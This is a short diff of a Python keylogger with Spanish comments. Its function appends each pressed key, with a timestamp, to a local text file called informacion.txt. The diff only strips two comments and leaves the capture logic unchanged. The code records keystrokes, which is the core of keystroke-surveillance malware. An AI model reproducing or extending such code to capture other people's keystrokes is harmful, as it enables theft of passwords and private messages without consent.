@@ -3,11 +3,11 @@ import datetime
 
 def registrar_tecla(tecla):
     
-    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') # Para obtener la fecha exacta de la punsacion
+    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') 
     
     try:
         with open('informacion.txt', 'a') as archivo:
-              archivo.write(f"[{timestamp}] - {tecla.char}\n")  # Guarda solo el caracter de la tecla presionada
+              archivo.write(f"[{timestamp}] - {tecla.char}\n")  
     except AttributeError:
         with open('informacion.txt', 'a') as archivo:
             archivo.write(f"{tecla}\n")  # Guarda teclas especiales como Enter, Shift, etc.
